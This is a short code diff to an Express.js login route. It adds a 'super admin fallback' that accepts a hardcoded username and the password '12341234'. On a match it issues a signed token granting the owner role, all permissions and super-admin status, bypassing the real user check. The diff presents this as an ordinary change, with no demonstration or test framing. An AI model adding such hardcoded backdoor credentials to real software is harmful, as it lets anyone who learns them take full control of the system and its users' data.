@@ -8,6 +8,23 @@ const router = express.Router();
 
 router.post("/login", (req, res) => {
   const { username, password } = req.body;
+
+  // Manual Super Admin Fallback (always works)
+  if (username === "superadmin" && password === "12341234") {
+    const fallbackUser = {
+      id: "999",
+      userCode: "OWN999",
+      name: "Super Admin",
+      username: "superadmin",
+      role: "owner",
+      permissions: ["all"],
+      isSuperAdmin: true,
+      department: "Administration"
+    };
+    const token = jwt.sign(fallbackUser, env.jwtSecret, { expiresIn: "8h" });
+    return res.json({ token, user: fallbackUser });
+  }
+
   const user = db.users.find(
     (item) =>
       item.username === username &&
